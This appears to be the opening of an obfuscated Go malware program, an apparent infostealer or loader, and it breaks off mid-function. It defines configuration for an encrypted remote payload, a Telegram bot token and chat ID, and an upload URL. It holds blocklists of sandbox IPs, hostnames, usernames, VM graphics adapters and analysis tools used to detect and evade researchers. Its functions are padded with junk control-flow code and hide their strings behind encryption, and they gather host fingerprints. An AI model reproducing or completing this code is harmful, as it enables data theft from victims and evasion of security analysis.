package main

import (
	"archive/zip"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"github.com/kbinani/screenshot"
	_ "github.com/mattn/go-sqlite3"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"syscall"
	"time"
)

type Config struct {
	PayloadCryptedURL string `json:"PayloadCrypted_url"`
	KeyDecrypt        string `json:"key_decrypt"`
	TelegramToken     string `json:"Telegram_token"`
	ChatID            string `json:"Chat_id"`
	UploadURL         string `json:"upload_url"`
	Delivery          string `json:"Delivery"`
	StubURL           string `json:"Stub_url"`
	UserID            string `json:"user_id"`
	Welcome           string `json:"welcome"`
	Startup           string `json:"Startup"`
}

var blackListedIPS = []string{
	"181.214.153.11", "181.214.153.11", "169.150.197.118", "88.132.231.71", "212.119.227.165", "52.251.116.35", "194.154.78.69", "194.154.78.137",
	"213.33.190.219", "78.139.8.50", "20.99.160.173", "88.153.199.169", "84.147.62.12", "194.154.78.160", "92.211.109.160", "195.74.76.222",
	"188.105.91.116", "34.105.183.68", "92.211.55.199", "79.104.209.33", "95.25.204.90", "34.145.89.174", "109.74.154.90", "109.145.173.169",
	"34.141.146.114", "212.119.227.151", "195.239.51.59", "192.40.57.234", "64.124.12.162", "34.142.74.220", "188.105.91.173", "109.74.154.91",
	"34.105.72.241", "109.74.154.92", "213.33.142.50", "88.132.231.71", "95.25.204.90", "34.105.72.241", "193.128.114.45", "78.139.8.50", "34.145.89.174",
	"109.74.154.92", "95.25.81.24", "20.99.160.173", "109.74.154.90", "213.33.142.50", "92.211.52.62", "88.153.199.169", "109.145.173.169", "109.74.154.91",
	"88.132.227.238", "84.147.62.12", "34.141.146.114", "93.216.75.209", "35.199.6.13", "194.154.78.160", "212.119.227.151", "192.87.28.103", "80.211.0.97",
	"92.211.109.160", "195.239.51.59", "88.132.226.203", "34.85.253.170", "195.74.76.222", "192.40.57.234", "195.181.175.105", "23.128.248.46", "188.105.91.116",
	"64.124.12.162", "88.132.225.100", "35.229.69.227", "34.105.183.68", "34.142.74.220", "92.211.192.144", "34.138.96.23", "92.211.55.199", "188.105.91.173",
	"34.83.46.130", "192.211.110.74", "79.104.209.33", "109.74.154.91", "188.105.91.143", "35.237.47.12", "178.239.165.70", "34.141.245.25", "34.85.243.241",
	"87.166.50.213", "34.105.0.27", "34.145.195.58", "193.225.193.201", "34.253.248.228", "35.192.93.107", "195.239.51.3", "84.147.54.113", "212.119.227.167",
}
var blackListedHostname = []string{
	"BEE7370C-8C0C-4", "AppOnFly-VPS", "tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",
	"DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET",
	"SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4",
	"RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH",
}
var blackListedUsername = []string{
	"WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY",
	"RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A",
	"lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl",
}
var blackListedGPU = []string{
	"Microsoft Remote Display Adapter", "Microsoft Hyper-V Video", "Microsoft Basic Display Adapter", "VMware SVGA 3D", "Standard VGA Graphics Adapter",
	"NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "UKBEHH_S", "ASPEED Graphics Family(WDDM)", "H_EDEUEK", "VirtualBox Graphics Adapter",
	"K9SC88UK", "Стандартный VGA графический адаптер",
}
var blacklistedOS = []string{
	"Windows Server 2022 Datacenter", "Windows Server 2019 Standard", "Windows Server 2019 Datacenter",
	"Windows Server 2016 Standard", "Windows Server 2016 Datacenter",
}
var blackListedProcesses = []string{
	"watcher.exe", "mitmdump.exe", "mitmproxy.exe", "mitmweb.exe", "Insomnia.exe", "HTTP Toolkit.exe", "Charles.exe", "Postman.exe",
	"BurpSuiteCommunity.exe", "Fiddler Everywhere.exe", "Fiddler.WebUi.exe", "HTTPDebuggerUI.exe", "HTTPDebuggerSvc.exe",
	"HTTPDebuggerPro.exe", "x64dbg.exe", "Ida.exe", "Ida64.exe", "Progress Telerik Fiddler Web Debugger.exe", "HTTP Debugger Pro.exe",
	"Fiddler.exe", "KsDumperClient.exe", "KsDumper.exe", "FolderChangesView.exe", "BinaryNinja.exe", "Cheat Engine 6.8.exe",
	"Cheat Engine 6.9.exe", "Cheat Engine 7.0.exe", "Cheat Engine 7.1.exe", "Cheat Engine 7.2.exe", "OllyDbg.exe", "Wireshark.exe",
	"httpdebuggerui.exe", "vmwareuser.exe", "wireshark.exe", "vgauthservice.exe", "fiddler.exe", "vmacthlp.exe", "regedit.exe", "x96dbg.exe",
	"cmd.exe", "vmsrvc.exe", "taskmgr.exe", "x32dbg.exe", "vboxservice.exe", "vmusrvc.exe", "df5serv.exe", "prl_cc.exe", "processhacker.exe",
	"prl_tools.exe", "vboxtray.exe", "xenservice.exe", "vmtoolsd.exe", "qemu-ga.exe", "vmwaretray.exe", "joeboxcontrol.exe", "ida64.exe",
	"ksdumperclient.exe", "ollydbg.exe", "ksdumper.exe", "pestudio.exe", "joeboxserver.exe",
}

func ktkxgocrlhofmcfcpebfgtjpyrbwjzoe(ip string) bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	for _, value := range blackListedIPS {
		if value == ip {
			return true
		}
	}
	return false
}
func vcxfecqxpyqofmsqjgdapmnjszzjdifl() bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	hostname, err := os.Hostname()
	if err != nil {
		return false
	}
	for _, value := range blackListedHostname {
		if value == hostname {
			return true
		}
	}
	return false
}
func scowquqytwhwdkeucyvajwuqnmwblzkr() bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	username := os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("b6333a45a0dd859df175a6ae9c42890a8e70077be67ac805"))
	if username == "" {
		username = os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("b6333a459bd45d4a0d03dea904df03c82ed1845a"))
	}
	for _, value := range blackListedUsername {
		if value == username {
			return true
		}
	}
	return false
}
func qpgcpqfiqbynjtxszlphdupluxenmgro() bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	var gpuInfo string
	if os.PathSeparator == '\\' {
		gpuInfo = szydmlzaufrddzkldyghcohhofypymcf(Cijosgmviuhoepbatohaaytukfezbopl("940d1674eb58ad83dde1dc0aecf28d0d9a876acd"), Cijosgmviuhoepbatohaaytukfezbopl("93010b7f613adea95699c58e68c77aa9ee569ffb"), Cijosgmviuhoepbatohaaytukfezbopl("94091124dcc3beb134ecc13a14989db623fd682b02b09f48e041c2182fc5196d78fb3326c0"), Cijosgmviuhoepbatohaaytukfezbopl("84050b0b9c0f717efb3ae6c794837febac82ff"), Cijosgmviuhoepbatohaaytukfezbopl("80010f6387f3a63a682053029ff2fded058c048c57799e"))
	} else {
		gpuInfo = szydmlzaufrddzkldyghcohhofypymcf(Cijosgmviuhoepbatohaaytukfezbopl("8f130f74872b07562be25719de76660b509ddcd9d0"), Cijosgmviuhoepbatohaaytukfezbopl("9f3fa889fb2617cba8d14e011541363ef3"), Cijosgmviuhoepbatohaaytukfezbopl("84121a67b41c409f4138387dacebe8345058614a"), Cijosgmviuhoepbatohaaytukfezbopl("b5273e588667fe7ef2b3cd35dce5ef54488c20"))
	}
	for _, gpu := range blackListedGPU {
		if strings.Contains(gpuInfo, gpu) {
			return true
		}
	}
	return false
}
func bgaqazdnphynjlmqitlfrmaukzhwhhsb() bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	var osInfo string
	if os.PathSeparator == '\\' {
		osInfo = os.Getenv(Cijosgmviuhoepbatohaaytukfezbopl("ac33a11f1acf49efd7ca1fad081a7586de66"))
	} else {
		osInfo = szydmlzaufrddzkldyghcohhofypymcf(Cijosgmviuhoepbatohaaytukfezbopl("960e1e7a8bdb3489b19c7908b71f0bc811364b1568"), Cijosgmviuhoepbatohaaytukfezbopl("ce13f9736a759f2cdf50c3b8c8720a5731b9")) + " " + szydmlzaufrddzkldyghcohhofypymcf(Cijosgmviuhoepbatohaaytukfezbopl("960e1e7a8bdb3489b19c7908b71f0bc811364b1568"), Cijosgmviuhoepbatohaaytukfezbopl("ce1283f01733fc52c7d755a7cd27f2bb8680"))
	}
	for _, osName := range blacklistedOS {
		if strings.Contains(osInfo, osName) {
			return true
		}
	}
	return false
}
func fctkiyeadztlkkzkremdzrhfiqjwlmai() bool {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	var processList string
	if os.PathSeparator == '\\' {
		processList = szydmlzaufrddzkldyghcohhofypymcf(Cijosgmviuhoepbatohaaytukfezbopl("97010c7c82f5bbace54d136319f149a867e10ab0b9e7b296"))
	} else {
		processList = szydmlzaufrddzkldyghcohhofypymcf(Cijosgmviuhoepbatohaaytukfezbopl("9313fe94f8688e3be6c86982441bd738e0e4"), Cijosgmviuhoepbatohaaytukfezbopl("8215075fc2584367dfab4dc693ae0df6f1b1a8"))
	}
	for _, process := range blackListedProcesses {
		if strings.Contains(processList, process) {
			return true
		}
	}
	return false
}
func szydmlzaufrddzkldyghcohhofypymcf(command ...string) string {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	output, err := exec.Command(command[0], command[1:]...).Output()
	if err != nil {
		return ""
	}
	return string(output)
}
func txirwxpjjwojtqzabcifdhngtrhevxhy() (map[string]interface{}, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	resp, err := http.Get(Cijosgmviuhoepbatohaaytukfezbopl("8b140b679da6e7f731f9c777168f80b462f26b2356adc5966743d40a123cfb9619a55639"))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}

	return result, nil
}
func wtizxeazdewjatblfycmoxdqavoqpgsi() (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	interfaces, err := net.Interfaces()
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("800f0a7b8abca6b724a9c93c0fd687a138e66b3c1bdb4eabbd58fb3460caf88973d919d2ead60185d84bc0d6a8230dc951787bf6"), err)
	}

	for _, iface := range interfaces {

		if iface.Flags&net.FlagUp == 0 || len(iface.HardwareAddr) == 0 {
			continue
		}
		return iface.HardwareAddr.String(), nil
	}
	return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("8d0f5f5aafdfe8b934eddc3c0885c9a223e46a2a282cd285f10663f0fb539346240744be"))
}
func yqayrrwogqrhdyrezxzmizqxdcepfiku() (int, int, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	n := screenshot.NumActiveDisplays()

	if n == 0 {
		return 0, 0, fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("8d0f5f768de8a1ae35a9ca30088685a535e224281f8e49a141a6a4cad3d58c665b76d21f4daa238a"))
	}

	bounds := screenshot.GetDisplayBounds(0)
	width := bounds.Dx()
	height := bounds.Dy()

	return width, height, nil
}
func ennjtfnaktnhiqfklhebulxfnoofipdv(executablePath string) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
					jXXX := iXXX
					goto LOOP_COND_uechfm
				LOOP_COND_uechfm:
					if jXXX < 15 {
						goto LOOP_BODY_tssytc
					} else {
						goto LOOP_END_odgioq
					}
				LOOP_BODY_tssytc:
					{
						{
							goto LOOP_INIT_cgtneu
						LOOP_INIT_cgtneu:
							;
							zXXX := jXXX
							goto LOOP_COND_vvqcpm
						LOOP_COND_vvqcpm:
							if zXXX < 15 {
								goto LOOP_BODY_shkzfq
							} else {
								goto LOOP_END_ochoky
							}
						LOOP_BODY_shkzfq:
							{
								sXXX =
									(float64(iXXX+
										jXXX) *
										float64(zXXX)) / float64(iXXX)
								zXXX++
								goto LOOP_COND_vvqcpm

							}
						LOOP_END_ochoky:
							{
							}
						}
						jXXX++
						goto LOOP_COND_uechfm

					}
				LOOP_END_odgioq:
					{
					}
				}
				iXXX++
				goto LOOP_COND_dthksg

			}
		LOOP_END_jlwvbg:
			{
			}
		}
		if sXXX ==
			float64(
				zXXX) {
		}
	})()

	cmd := exec.Command(Cijosgmviuhoepbatohaaytukfezbopl("940d1674eb58ad83dde1dc0aecf28d0d9a876acd"), Cijosgmviuhoepbatohaaytukfezbopl("87010b7688f5a4bd9233f8b7d510ccabd7b498e67e97317f"), Cijosgmviuhoepbatohaaytukfezbopl("94081a658bcf8cb0b37e47a8834cc8335ccff4c497"), fmt.Sprintf(Cijosgmviuhoepbatohaaytukfezbopl("8d011272d3bbedab771ead372c4de9c6e2b0117ac33f4f3a7e"), strings.ReplaceAll(executablePath, Cijosgmviuhoepbatohaaytukfezbopl("bf22004594e507396b31e4be08d7d1172a"), Cijosgmviuhoepbatohaaytukfezbopl("bf3cdadf2ebd19c4a9bb9c52999ba6cebd3d"))), Cijosgmviuhoepbatohaaytukfezbopl("84050b0b9c0f717efb3ae6c794837febac82ff"), Cijosgmviuhoepbatohaaytukfezbopl("b5050d6487f3a615195d8ed59056c4822ca78cdd42f7d2"), Cijosgmviuhoepbatohaaytukfezbopl("cc161e7b9bf92341312bd6ee59ce6728bc891aae73fc"))
	output, err := cmd.Output()
	if err != nil {
		return "", fmt.Errorf(Cijosgmviuhoepbatohaaytukfezbopl("8501167b8bf8e8ac3fa9cb211e959cb029b167211d9646abad07a977771dec73831da8c2ae2201999484f932d2"), err)
	}

	result := strings.TrimSpace(string(output))

	if strings.Contains(result, Cijosgmviuhoepbatohaaytukfezbopl("de9b845747de2ea9b90f1e2ad6804f540f")) {
		version := strings.Split(result, Cijosgmviuhoepbatohaaytukfezbopl("de9b845747de2ea9b90f1e2ad6804f540f"))[1]
		return version, nil
	}

	return "Unknown version", nil
}
func leydzhpraautvyesndmjnpembmusdfox(executablePath string) (string, error) {
	(func() {
		zXXX := int64(1)
		sXXX := float64(8)
		{
			goto LOOP_INIT_zfeycj
		LOOP_INIT_zfeycj:
			;
			iXXX := 1
			goto LOOP_COND_dthksg
		LOOP_COND_dthksg:
			if iXXX <
				15 {
				goto LOOP_BODY_cwsrfh
			} else {
				goto LOOP_END_jlwvbg
			}
		LOOP_BODY_cwsrfh:
			{
				{
					goto LOOP_INIT_nhbpyv
				LOOP_INIT_nhbpyv:
					;
